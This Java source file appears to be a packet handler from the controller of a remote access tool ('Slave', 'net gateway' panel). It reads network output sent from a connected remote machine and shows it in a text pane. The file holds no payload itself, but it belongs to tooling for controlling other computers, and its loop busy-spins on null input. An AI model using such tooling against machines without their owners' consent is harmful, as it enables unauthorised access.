package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlNetGateway;

public class PacketIPC extends AbstractPacket {
	
	@Override
	public void read(Slave slave, String line) throws Exception {
		
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		PanelControlNetGateway panel = null;
		if (frame != null) {
			panel = (PanelControlNetGateway) frame.panels.get("net gateway");
		}
		
		while (true) {
			line = slave.readLine();
			if (line == null) {
				continue;
			}
			if (line.equals("END")) {
				break;
			}
			if (panel != null) {
				panel.getPane().getDocument().insertString(panel.getPane().getDocument().getLength(), line + "\n", null);
			}
		}
	}

}
